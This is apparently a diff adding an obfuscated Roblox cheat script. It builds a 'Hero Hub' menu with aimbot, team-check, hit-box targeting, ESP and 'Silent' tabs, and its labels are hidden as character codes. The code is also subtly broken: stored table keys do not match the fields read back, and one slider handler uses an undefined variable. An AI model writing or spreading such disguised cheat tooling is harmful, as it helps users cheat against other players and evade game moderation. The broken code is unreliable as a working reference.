+_0xEFCA.Position = UDim2.new(0,56,0,10)
+_0xEFCA.Size = UDim2.new(0,300,0,20)
+_0xEFCA.Font = _0xD38E; _0xEFCA.TextSize = 15
+_0xEFCA.Text =string.char(72,101,114,111,32,72,117,98)_0xEFCA.TextColor3 = _0x629D.TEXT
+_0xEFCA.TextXAlignment = Enum.TextXAlignment.Left
+local _0xDD5B = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xF4E6)
+_0xDD5B.BackgroundTransparency = 1
+_0xDD5B.Position = UDim2.new(0,56,0,28)
+_0xDD5B.Size = UDim2.new(0,300,0,14)
+_0xDD5B.Font = _0x63AA; _0xDD5B.TextSize = 9
+_0xDD5B.Text =string.char(66,76,65,67,75,32,194,183,32,86,49,46,52)_0xDD5B.TextColor3 = _0x629D.DIM
+_0xDD5B.TextXAlignment = Enum.TextXAlignment.Left
+local _0x955B = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0xF4E6)
+_0x955B.BackgroundTransparency = 1
+_0x955B.AnchorPoint = Vector2.new(1,0.5)
+_0x955B.Position = UDim2.new(1,-108,0.5,0)
+_0x955B.Size = UDim2.new(0,120,0,26)
+_0x955B.Font = _0x63AA; _0x955B.TextSize = 10
+_0x955B.TextColor3 = _0x629D.DIM
+_0x955B.TextXAlignment = Enum.TextXAlignment.Right
+_0x955B.Text =""local _0x0821 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0xF4E6)
+_0x0821.BackgroundColor3 = _0x629D.CARD
+_0x0821.BackgroundTransparency = _0xEA66
+_0x0821.AnchorPoint = Vector2.new(1,0.5)
+_0x0821.Position = UDim2.new(1,-12,0.5,0)
+_0x0821.Size = UDim2.new(0,84,0,28)
+_0x0821.Font = _0xD38E; _0x0821.TextSize = 10
+_0x0821.Text =string.char(216,165,216,174,217,129,216,167,216,161,32,72)_0x0821.TextColor3 = _0x629D.TEXT
+_0x0821.AutoButtonColor = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x0821).CornerRadius = UDim.new(0,7)
+local _0xFE88 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x0821); _0xFE88.Color = _0x629D.BORDER; _0xFE88.Thickness = 1; _0xFE88.Transparency = 0.5
+_0xF592(_0x0821, _0x629D.CARD, _0x629D.CARD_HI)
+_0xD6A3(_0x0821)
+local _0xEBEF = Instance.new(string.char(73,109,97,103,101,66,117,116,116,111,110), _0x46FA)
+_0xEBEF.BackgroundColor3 = _0x629D.PANEL
+_0xEBEF.BackgroundTransparency = _0x7AA8
+_0xEBEF.Position = UDim2.new(0.5,-24,0.03,0)
+_0xEBEF.Size = UDim2.new(0,48,0,48)
+_0xEBEF.Image = _0x69B7
+_0xEBEF.ScaleType = Enum.ScaleType.Stretch
+_0xEBEF.Visible = false; _0xEBEF.Active = true; _0xEBEF.Draggable = true
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xEBEF).CornerRadius = UDim.new(0,10)
+local _0x048C = Instance.new(string.char(85,73,83,116,114,111,107,101), _0xEBEF); _0x048C.Color = _0x629D.BORDER; _0x048C.Thickness = 1
+local _0x8D6C = false
+local function _0x0C6D()
+if _0x8D6C then return end
+_0x8D6C = true
+_0x7E5C.Visible = true
+_0x7E5C.Size = UDim2.new(0, 844, 0, 548)
+_0x7E5C.BackgroundTransparency = 1
+_0xA3AA:Create(_0x7E5C, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+Size = UDim2.new(0, 860, 0, 560),
+BackgroundTransparency = _0xE389,
+}):Play()
+task.wait(0.2)
+_0x8D6C = false
+end
+local function _0xABC0()
+if _0x8D6C then return end
+_0x8D6C = true
+_0xA3AA:Create(_0x7E5C, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+Size = UDim2.new(0, 844, 0, 548),
+BackgroundTransparency = 1,
+}):Play()
+task.wait(0.17)
+_0x7E5C.Visible = false
+_0x8D6C = false
+end
+local function _0x839C()
+if _0x7E5C.Visible then
+_0xABC0()
+_0x5FFB.HideForScreen = true
+_0xEBEF.Visible = true
+else
+_0xEBEF.Visible = false
+_0x5FFB.HideForScreen = false
+_0x0C6D()
+end
+end
+_0x0821.MouseButton1Click:Connect(_0x839C)
+_0xEBEF.MouseButton1Click:Connect(_0x839C)
+_0xA134.InputBegan:Connect(function(i)
+if i.KeyCode==Enum.KeyCode.H and not _0xA134:GetFocusedTextBox() then _0x839C() end
+end)
+task.wait(0.25)
+_0x0C6D()local _0x4FC3 = Instance.new(string.char(70,114,97,109,101), _0x7E5C)
+_0x4FC3.BackgroundColor3 = _0x629D.PANEL
+_0x4FC3.BackgroundTransparency = _0x7AA8
+_0x4FC3.Position = UDim2.new(0,0,0,52)
+_0x4FC3.Size = UDim2.new(0,200,1,-52)
+_0x4FC3.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x4FC3).CornerRadius = UDim.new(0,12)
+local _0x3308 = Instance.new(string.char(70,114,97,109,101), _0x4FC3)
+_0x3308.BackgroundColor3 = _0x629D.PANEL
+_0x3308.BackgroundTransparency = _0x7AA8
+_0x3308.Position = UDim2.new(1,-10,0,0)
+_0x3308.Size = UDim2.new(0,10,1,0)
+_0x3308.BorderSizePixel = 0
+local _0x0392 = Instance.new(string.char(70,114,97,109,101), _0x7E5C)
+_0x0392.BackgroundColor3 = _0x629D.BORDER
+_0x0392.BackgroundTransparency = 0.5
+_0x0392.Position = UDim2.new(0,200,0,52)
+_0x0392.Size = UDim2.new(0,1,1,-52)
+_0x0392.BorderSizePixel = 0
+local _0x11DE = Instance.new(string.char(70,114,97,109,101), _0x4FC3)
+_0x11DE.BackgroundColor3 = _0x629D.CARD
+_0x11DE.BackgroundTransparency = 0.25
+_0x11DE.Position = UDim2.new(0,8,0,8)
+_0x11DE.Size = UDim2.new(1,-16,0,30)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x11DE).CornerRadius = UDim.new(0,7)
+local _0xA3D8 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x11DE)
+_0xA3D8.BackgroundTransparency=1
+_0xA3D8.Position=UDim2.new(0,8,0,0)
+_0xA3D8.Size=UDim2.new(0,18,1,0)
+_0xA3D8.Font=_0x63AA; _0xA3D8.TextSize=12
+_0xA3D8.Text=string.char(226,140,149)_0xA3D8.TextColor3=_0x629D.DIM
+_0xA3D8.TextXAlignment=Enum.TextXAlignment.Left
+local _0x72A1 = Instance.new(string.char(84,101,120,116,66,111,120), _0x11DE)
+_0x72A1.BackgroundTransparency=1
+_0x72A1.Position=UDim2.new(0,28,0,0)
+_0x72A1.Size=UDim2.new(1,-34,1,0)
+_0x72A1.Font=_0x7714; _0x72A1.TextSize=11
+_0x72A1.PlaceholderText=string.char(83,101,97,114,99,104,46,46,46)_0x72A1.PlaceholderColor3=_0x629D.MUTED
+_0x72A1.Text=""_0x72A1.TextColor3=_0x629D.TEXT
+_0x72A1.TextXAlignment=Enum.TextXAlignment.Left
+_0x72A1.ClearTextOnFocus=false
+local _0x48A2 = Instance.new(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101), _0x4FC3)
+_0x48A2.BackgroundTransparency = 1
+_0x48A2.Position = UDim2.new(0,4,0,46)
+_0x48A2.Size = UDim2.new(1,-8,1,-52)
+_0x48A2.CanvasSize = UDim2.new(0,0,0,540)
+_0x48A2.ScrollBarThickness = 2
+_0x48A2.ScrollBarImageColor3 = _0x629D.ACCENT_2
+local _0xA2A6 = Instance.new(string.char(70,114,97,109,101), _0x7E5C)
+_0xA2A6.BackgroundTransparency = 1
+_0xA2A6.Position = UDim2.new(0,212,0,64)
+_0xA2A6.Size = UDim2.new(1,-224,1,-76)
+local _0x911F = {}
+local function _0x77DF(_0xF36D)
+local _0x32A5 = Instance.new(string.char(83,99,114,111,108,108,105,110,103,70,114,97,109,101), _0xA2A6)
+_0x32A5.BackgroundTransparency = 1
+_0x32A5.Size = UDim2.new(1,0,1,0)
+_0x32A5.CanvasSize = UDim2.new(0,0,0,700)
+_0x32A5.ScrollBarThickness = 3
+_0x32A5.ScrollBarImageColor3 = _0x629D.ACCENT_2
+_0x32A5.Visible = false
+_0x911F[_0xF36D] = _0x32A5
+return _0x32A5
+end
+local _0xA387 = _0x77DF(string.char(67,111,109,98,97,116))
+local _0x2B49 = _0x77DF(string.char(83,105,108,101,110,116))
+local _0x6FA3 = _0x77DF(string.char(69,83,80))
+local _0x98BC = _0x77DF(string.char(80,108,97,121,101,114))
+local _0xDF5F = _0x77DF(string.char(83,101,114,118,101,114))
+local _0x2347 = _0x77DF(string.char(67,111,110,102,105,103))
+_0xA387.Visible = truelocal function _0xF372(parent, style, _0x6926)
+local _0xC910 = Instance.new(string.char(70,114,97,109,101), parent)
+_0xC910.BackgroundTransparency = 1
+_0xC910.Position = UDim2.new(0, 12, 0.5, -10)
+_0xC910.Size = UDim2.new(0, 20, 0, 20)
+_0xC910.BorderSizePixel = 0
+if style ==string.char(99,114,111,115,115,104,97,105,114)then
+local _0xB549 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0xB549.BackgroundTransparency = 1
+_0xB549.Size = UDim2.new(1,0,1,0)
+_0xB549.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xB549).CornerRadius = UDim.new(1,0)
+local _0xE9A8 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0xB549); _0xE9A8.Color = _0x6926; _0xE9A8.Thickness = 1.5
+local _0x03BD = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x03BD.BackgroundColor3 = _0x6926
+_0x03BD.AnchorPoint = Vector2.new(0.5,0.5)
+_0x03BD.Position = UDim2.new(0.5,0,0.5,0)
+_0x03BD.Size = UDim2.new(0,4,0,4)
+_0x03BD.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x03BD).CornerRadius = UDim.new(1,0)
+elseif style ==string.char(98,111,108,116)then
+for i = 0, 1 do
+local _0x403F = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x403F.BackgroundColor3 = _0x6926
+_0x403F.AnchorPoint = Vector2.new(0.5,0.5)
+_0x403F.Position = UDim2.new(0.5, (i-0.5)*6, 0.5, 0)
+_0x403F.Size = UDim2.new(0, 2, 0, 14)
+_0x403F.Rotation = 20
+_0x403F.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x403F).CornerRadius = UDim.new(1,0)
+end
+elseif style ==string.char(101,121,101)then
+local _0x369D = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x369D.BackgroundTransparency = 1
+_0x369D.AnchorPoint = Vector2.new(0.5,0.5)
+_0x369D.Position = UDim2.new(0.5,0,0.5,0)
+_0x369D.Size = UDim2.new(1,0,0.6,0)
+_0x369D.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x369D).CornerRadius = UDim.new(1,0)
+local _0x2686 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x369D); _0x2686.Color = _0x6926; _0x2686.Thickness = 1.5
+local _0xB231 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0xB231.BackgroundColor3 = _0x6926
+_0xB231.AnchorPoint = Vector2.new(0.5,0.5)
+_0xB231.Position = UDim2.new(0.5,0,0.5,0)
+_0xB231.Size = UDim2.new(0,5,0,5)
+_0xB231.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xB231).CornerRadius = UDim.new(1,0)
+elseif style ==string.char(102,105,103,117,114,101)then
+local _0xED57 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0xED57.BackgroundColor3 = _0x6926
+_0xED57.AnchorPoint = Vector2.new(0.5,0)
+_0xED57.Position = UDim2.new(0.5,0,0,2)
+_0xED57.Size = UDim2.new(0,6,0,6)
+_0xED57.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xED57).CornerRadius = UDim.new(1,0)
+local _0x7CA9 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x7CA9.BackgroundColor3 = _0x6926
+_0x7CA9.AnchorPoint = Vector2.new(0.5,0)
+_0x7CA9.Position = UDim2.new(0.5,0,0,10)
+_0x7CA9.Size = UDim2.new(0,9,0,7)
+_0x7CA9.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x7CA9).CornerRadius = UDim.new(0,2)
+elseif style ==string.char(103,108,111,98,101)then
+local _0xB549 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0xB549.BackgroundTransparency = 1
+_0xB549.Size = UDim2.new(1,0,1,0)
+_0xB549.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xB549).CornerRadius = UDim.new(1,0)
+local _0xE9A8 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0xB549); _0xE9A8.Color = _0x6926; _0xE9A8.Thickness = 1.5
+local _0x403F = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x403F.BackgroundColor3 = _0x6926
+_0x403F.AnchorPoint = Vector2.new(0.5,0.5)
+_0x403F.Position = UDim2.new(0.5,0,0.5,0)
+_0x403F.Size = UDim2.new(0.7,0,0,1.5)
+_0x403F.BorderSizePixel = 0
+elseif style ==string.char(103,101,97,114)then
+local _0x0104 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x0104.BackgroundTransparency = 1
+_0x0104.AnchorPoint = Vector2.new(0.5,0.5)
+_0x0104.Position = UDim2.new(0.5,0,0.5,0)
+_0x0104.Size = UDim2.new(0, 13, 0, 13)
+_0x0104.Rotation = 45
+_0x0104.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x0104).CornerRadius = UDim.new(0,3)
+local _0xE602 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x0104); _0xE602.Color = _0x6926; _0xE602.Thickness = 1.5
+local _0x1941 = Instance.new(string.char(70,114,97,109,101), _0xC910)
+_0x1941.BackgroundColor3 = _0x6926
+_0x1941.AnchorPoint = Vector2.new(0.5,0.5)
+_0x1941.Position = UDim2.new(0.5,0,0.5,0)
+_0x1941.Size = UDim2.new(0,5,0,5)
+_0x1941.BorderSizePixel = 0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x1941).CornerRadius = UDim.new(0,2)
+end
+return _0xC910
+endlocal _0x6B25 = {}
+local _0x1223 = 6
+local function _0xBB0C(iconStyle, iconColor, label, panel)
+local _0x7572 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0x48A2)
+_0x7572.BackgroundColor3 = _0x629D.CARD
+_0x7572.BackgroundTransparency = 1
+_0x7572.Position = UDim2.new(0,0,0,_0x1223)
+_0x7572.Size = UDim2.new(1,0,0,38)
+_0x7572.Font = _0x63AA; _0x7572.TextSize = 12
+_0x7572.Text =string.char(32,32,32,32,32,32,32,32,32,32,32,32)..label
+_0x7572.TextColor3 = _0x629D.DIM
+_0x7572.TextXAlignment = Enum.TextXAlignment.Left
+_0x7572.AutoButtonColor = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x7572).CornerRadius = UDim.new(0,7)
+_0xF372(_0x7572, iconStyle, iconColor)
+local _0x8F11 = Instance.new(string.char(70,114,97,109,101), _0x7572)
+_0x8F11.BackgroundColor3 = _0x629D.ACCENT
+_0x8F11.Position = UDim2.new(0,0,0.5,-9)
+_0x8F11.Size = UDim2.new(0,2,0,18)
+_0x8F11.BorderSizePixel = 0
+_0x8F11.Visible = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x8F11).CornerRadius = UDim.new(1,0)
+_0x7572.MouseEnter:Connect(function()
+if _0x7572.TextColor3 ~= _0x629D.TEXT then
+_0xA3AA:Create(_0x7572, TweenInfo.new(0.12), {BackgroundTransparency=0.7}):Play()
+end
+end)
+_0x7572.MouseLeave:Connect(function()
+if _0x7572.TextColor3 ~= _0x629D.TEXT then
+_0xA3AA:Create(_0x7572, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play()
+end
+end)
+_0x7572.MouseButton1Click:Connect(function()
+for _, px in pairs(_0x911F) do px.Visible = false end
+panel.Visible = true
+for _, o in ipairs(_0x6B25) do
+_0xA3AA:Create(o.btn, TweenInfo.new(0.12), {BackgroundTransparency=1}):Play()
+o.btn.TextColor3 = _0x629D.DIM
+o.ind.Visible = false
+end
+_0xA3AA:Create(_0x7572, TweenInfo.new(0.12), {BackgroundTransparency=0.5}):Play()
+_0x7572.TextColor3 = _0x629D.TEXT
+_0x8F11.Visible = true
+end)
+table.insert(_0x6B25, {_0x2434=_0x7572, _0x8F11=_0x8F11})
+_0x1223 = _0x1223 + 42
+end
+_0xBB0C(string.char(99,114,111,115,115,104,97,105,114), Color3.fromRGB(220, 110, 110),string.char(67,111,109,98,97,116), _0xA387)
+_0xBB0C(string.char(98,111,108,116), Color3.fromRGB(230, 200, 100),string.char(83,105,108,101,110,116), _0x2B49)
+_0xBB0C(string.char(101,121,101), Color3.fromRGB(110, 180, 230),string.char(69,83,80), _0x6FA3)
+_0xBB0C(string.char(102,105,103,117,114,101), Color3.fromRGB(130, 210, 130),string.char(80,108,97,121,101,114), _0x98BC)
+_0xBB0C(string.char(103,108,111,98,101), Color3.fromRGB(170, 130, 220),string.char(83,101,114,118,101,114), _0xDF5F)
+_0xBB0C(string.char(103,101,97,114), Color3.fromRGB(180, 180, 190),string.char(67,111,110,102,105,103), _0x2347)
+if _0x6B25[1] then
+_0x6B25[1].btn.BackgroundTransparency = 0.5
+_0x6B25[1].btn.TextColor3 = _0x629D.TEXT
+_0x6B25[1].ind.Visible = true
+endlocal function _0x7510(parent, text, y)
+local _0xDA1A = Instance.new(string.char(84,101,120,116,76,97,98,101,108), parent)
+_0xDA1A.BackgroundTransparency = 1
+_0xDA1A.Position = UDim2.new(0,2,0,y)
+_0xDA1A.Size = UDim2.new(1,-4,0,22)
+_0xDA1A.Font = _0xD38E; _0xDA1A.TextSize = 12
+_0xDA1A.Text = text ..string.char(58)_0xDA1A.TextColor3 = _0x629D.TEXT
+_0xDA1A.TextXAlignment = Enum.TextXAlignment.Left
+return _0xDA1A
+end
+local function _0xF220(parent, title, desc, y, actionType, actionData, cb)
+local _0x6A10 = Instance.new(string.char(70,114,97,109,101), parent)
+_0x6A10.BackgroundColor3 = _0x629D.CARD
+_0x6A10.BackgroundTransparency = _0xEA66
+_0x6A10.Position = UDim2.new(0,0,0,y)
+_0x6A10.Size = UDim2.new(1,-12,0,60)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x6A10).CornerRadius = UDim.new(0,10)
+local _0x4C19 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x6A10)
+_0x4C19.Color = _0x629D.BORDER; _0x4C19.Thickness = 1; _0x4C19.Transparency = 0.5
+_0x6A10.MouseEnter:Connect(function()
+_0xA3AA:Create(_0x6A10, TweenInfo.new(0.12), {BackgroundTransparency = 0.15}):Play()
+_0xA3AA:Create(_0x4C19, TweenInfo.new(0.12), {Color = _0x629D.ACCENT, Transparency = 0.3}):Play()
+end)
+_0x6A10.MouseLeave:Connect(function()
+_0xA3AA:Create(_0x6A10, TweenInfo.new(0.12), {BackgroundTransparency = _0xEA66}):Play()
+_0xA3AA:Create(_0x4C19, TweenInfo.new(0.12), {Color = _0x629D.BORDER, Transparency = 0.5}):Play()
+end)
+local _0x53E4 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x6A10)
+_0x53E4.BackgroundTransparency=1
+_0x53E4.Position=UDim2.new(0,14,0,9)
+_0x53E4.Size=UDim2.new(1,-140,0,20)
+_0x53E4.Font=_0xD38E; _0x53E4.TextSize=12
+_0x53E4.Text=title
+_0x53E4.TextColor3=_0x629D.TEXT
+_0x53E4.TextXAlignment=Enum.TextXAlignment.Left
+local _0xE2E2 = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x6A10)
+_0xE2E2.BackgroundTransparency=1
+_0xE2E2.Position=UDim2.new(0,14,0,30)
+_0xE2E2.Size=UDim2.new(1,-140,0,16)
+_0xE2E2.Font=_0x7714; _0xE2E2.TextSize=10
+_0xE2E2.Text=desc
+_0xE2E2.TextColor3=_0x629D.DIM
+_0xE2E2.TextXAlignment=Enum.TextXAlignment.Left
+if actionType ==string.char(116,111,103,103,108,101)then
+local _0xF2DD = actionData
+local _0x1DA5 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0x6A10)
+_0x1DA5.BackgroundColor3 = _0xF2DD and _0x629D.ACCENT or _0x629D.CARD_HI
+_0x1DA5.BackgroundTransparency = _0xF2DD and 0.1 or 0.4
+_0x1DA5.AnchorPoint = Vector2.new(1,0.5)
+_0x1DA5.Position = UDim2.new(1,-14,0.5,0)
+_0x1DA5.Size = UDim2.new(0,58,0,24)
+_0x1DA5.Font = _0x63AA; _0x1DA5.TextSize = 10
+_0x1DA5.Text = _0xF2DD andstring.char(79,78)orstring.char(79,70,70)_0x1DA5.TextColor3 = _0xF2DD and Color3.fromRGB(10,10,10) or _0x629D.DIM
+_0x1DA5.AutoButtonColor = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x1DA5).CornerRadius = UDim.new(1,0)
+local _0x9D34 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x1DA5); _0x9D34.Color = _0xF2DD and _0x629D.ACCENT or _0x629D.BORDER; _0x9D34.Thickness = 1; _0x9D34.Transparency = 0.4
+_0xD6A3(_0x1DA5)
+_0x1DA5.MouseButton1Click:Connect(function()
+_0xF2DD = not _0xF2DD
+_0x1DA5.Text = _0xF2DD andstring.char(79,78)orstring.char(79,70,70)_0xA3AA:Create(_0x1DA5, TweenInfo.new(0.15), {
+BackgroundColor3 = _0xF2DD and _0x629D.ACCENT or _0x629D.CARD_HI,
+BackgroundTransparency = _0xF2DD and 0.1 or 0.4,
+}):Play()
+_0x1DA5.TextColor3 = _0xF2DD and Color3.fromRGB(10,10,10) or _0x629D.DIM
+_0x9D34.Color = _0xF2DD and _0x629D.ACCENT or _0x629D.BORDER
+cb(_0xF2DD)
+end)
+elseif actionType ==string.char(98,117,116,116,111,110)then
+local _0x2434 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0x6A10)
+_0x2434.BackgroundColor3 = _0x629D.CARD_HI
+_0x2434.BackgroundTransparency = 0.2
+_0x2434.AnchorPoint = Vector2.new(1,0.5)
+_0x2434.Position = UDim2.new(1,-14,0.5,0)
+_0x2434.Size = UDim2.new(0,110,0,30)
+_0x2434.Font = _0x63AA; _0x2434.TextSize = 11
+_0x2434.Text = actionData
+_0x2434.TextColor3 = _0x629D.TEXT
+_0x2434.AutoButtonColor = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x2434).CornerRadius = UDim.new(0,7)
+local _0x2837 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x2434); _0x2837.Color = _0x629D.BORDER; _0x2837.Thickness = 1; _0x2837.Transparency = 0.5
+_0xF592(_0x2434, _0x629D.CARD_HI, _0x629D.CARD)
+_0xD6A3(_0x2434)
+_0x2434.MouseButton1Click:Connect(cb)
+return _0x2434
+elseif actionType ==string.char(101,120,101,99,117,116,101)then
+local _0x2434 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0x6A10)
+_0x2434.BackgroundColor3 = _0x629D.CARD_HI
+_0x2434.BackgroundTransparency = 0.15
+_0x2434.AnchorPoint = Vector2.new(1,0.5)
+_0x2434.Position = UDim2.new(1,-14,0.5,0)
+_0x2434.Size = UDim2.new(0,44,0,30)
+_0x2434.Font = _0xD38E; _0x2434.TextSize = 13
+_0x2434.Text =string.char(226,150,182)_0x2434.TextColor3 = _0x629D.TEXT
+_0x2434.AutoButtonColor = false
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x2434).CornerRadius = UDim.new(0,7)
+local _0x2837 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x2434); _0x2837.Color = _0x629D.BORDER; _0x2837.Thickness = 1; _0x2837.Transparency = 0.4
+_0xF592(_0x2434, _0x629D.CARD_HI, _0x629D.CARD)
+_0xD6A3(_0x2434)
+_0x2434.MouseButton1Click:Connect(cb)
+end
+return _0x6A10
+end
+local function _0x6055(parent, title, mn, mx, cur, _0x6926, cb, y)
+local _0x6A10 = Instance.new(string.char(70,114,97,109,101), parent)
+_0x6A10.BackgroundColor3 = _0x629D.CARD
+_0x6A10.BackgroundTransparency = _0xEA66
+_0x6A10.Position = UDim2.new(0,0,0,y)
+_0x6A10.Size = UDim2.new(1,-12,0,66)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x6A10).CornerRadius = UDim.new(0,10)
+local _0x4C19 = Instance.new(string.char(85,73,83,116,114,111,107,101), _0x6A10); _0x4C19.Color = _0x629D.BORDER; _0x4C19.Thickness = 1; _0x4C19.Transparency = 0.5
+local _0xDA1A = Instance.new(string.char(84,101,120,116,76,97,98,101,108), _0x6A10)
+_0xDA1A.BackgroundTransparency=1
+_0xDA1A.Position=UDim2.new(0,14,0,9)
+_0xDA1A.Size=UDim2.new(1,-28,0,18)
+_0xDA1A.Font=_0xD38E; _0xDA1A.TextSize=12
+_0xDA1A.Text = title..string.char(58,32,32)..cur
+_0xDA1A.TextColor3=_0x629D.TEXT
+_0xDA1A.TextXAlignment=Enum.TextXAlignment.Left
+local _0x5EBE = Instance.new(string.char(70,114,97,109,101), _0x6A10)
+_0x5EBE.BackgroundColor3 = _0x629D.CARD_HI
+_0x5EBE.BackgroundTransparency = 0.3
+_0x5EBE.Position = UDim2.new(0,14,0,42)
+_0x5EBE.Size = UDim2.new(1,-28,0,6)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x5EBE).CornerRadius = UDim.new(1,0)
+local _0x4D22 = Instance.new(string.char(70,114,97,109,101), _0x5EBE)
+_0x4D22.BackgroundColor3 = _0x6926
+_0x4D22.Size = UDim2.new((cur-mn)/(mx-mn),0,1,0)
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0x4D22).CornerRadius = UDim.new(1,0)
+local _0xC951 = Instance.new(string.char(70,114,97,109,101), _0x5EBE)
+_0xC951.BackgroundColor3 = Color3.fromRGB(255,255,255)
+_0xC951.AnchorPoint = Vector2.new(0.5,0.5)
+_0xC951.Position = UDim2.new((cur-mn)/(mx-mn),0,0.5,0)
+_0xC951.Size = UDim2.new(0,12,0,12)
+_0xC951.BorderSizePixel=0
+Instance.new(string.char(85,73,67,111,114,110,101,114), _0xC951).CornerRadius = UDim.new(1,0)
+local _0x90D8 = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110), _0x5EBE)
+_0x90D8.BackgroundTransparency=1; _0x90D8.Size=UDim2.new(1,0,1,0); _0x90D8.Text=""local _0x8E16 = false
+_0x90D8.MouseButton1Down:Connect(function() _0x8E16=true end)
+_0xA134.InputEnded:Connect(function(i)
+if i.UserInputType==Enum.UserInputType.MouseButton1 then _0x8E16=false end
+end)
+_0xA134.InputChanged:Connect(function(i)
+if _0x8E16 and i.UserInputType==Enum.UserInputType.MouseMovement then
+local _0x4C78 = _0xA134:GetMouseLocation().X
+local _0xA7F8 = _0x5EBE.AbsolutePosition.X
+local _0xC9D8 = _0x5EBE.AbsoluteSize.X
+local _0x32A5 = math.clamp((_0x4C78-_0xA7F8)/_0xC9D8, 0, 1)
+local _0xF193 = math.floor(mn + _0x32A5*(mx-mn))
+_0x4D22.Size = UDim2.new(_0x32A5,0,1,0)
+_0xC951.Position = UDim2.new(_0x32A5,0,0.5,0)
+_0xDA1A.Text = title..string.char(58,32,32)..v
+cb(_0xF193)
+end
+end)
+end_0x7510(_0xA387,string.char(65,73,77,66,79,84), 4)
+_0xF220(_0xA387,string.char(82,105,103,104,116,45,67,108,105,99,107,32,65,105,109,98,111,116),string.char(83,109,111,111,116,104,32,99,97,109,101,114,97,32,97,105,109,32,119,104,101,110,32,82,77,66,32,104,101,108,100), 30,string.char(116,111,103,103,108,101), _0x5FFB.CombatEnabled, function(_0xF193)
+_0x5FFB.CombatEnabled=_0xF193; _0x5B2D()
+_0xA8E1(string.char(67,111,109,98,97,116,32,65,105,109,98,111,116), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0xF220(_0xA387,string.char(84,101,97,109,32,67,104,101,99,107),string.char(73,103,110,111,114,101,32,116,101,97,109,109,97,116,101,115), 100,string.char(116,111,103,103,108,101), _0x5FFB.TeamCheck, function(_0xF193)
+_0x5FFB.TeamCheck=_0xF193; _0x5B2D()
+_0xA8E1(string.char(84,101,97,109,32,67,104,101,99,107), _0xF193 andstring.char(69,110,97,98,108,101,100)orstring.char(68,105,115,97,98,108,101,100), _0xF193 and _0x629D.SUCCESS or _0x629D.MUTED)
+end)
+_0x7510(_0xA387,string.char(84,65,82,71,69,84), 174)
+local _0x4421 = _0xF220(_0xA387,string.char(65,105,109,32,80,97,114,116),string.char(67,104,111,111,115,101,32,104,105,116,45,98,111,120,32,108,111,99,97,116,105,111,110), 198,string.char(98,117,116,116,111,110), _0x5FFB.AimPart==string.char(72,101,97,100)andstring.char(72,101,97,100,32,32,226,150,190)orstring.char(84,111,114,115,111,32,32,226,150,190), function()
+if _0x5FFB.AimPart==string.char(72,101,97,100)then _0x5FFB.AimPart=string.char(85,112,112,101,114,84,111,114,115,111)else _0x5FFB.AimPart=string.char(72,101,97,100)end
+local _0x2434 = _0x4421:FindFirstChildWhichIsA(string.char(84,101,120,116,66,117,116,116,111,110))
+if _0x2434 then _0x2434.Text = (_0x5FFB.AimPart==string.char(72,101,97,100)andstring.char(72,101,97,100)orstring.char(84,111,114,115,111)) ..string.char(32,32,226,150,190)end
+_0x5B2D()
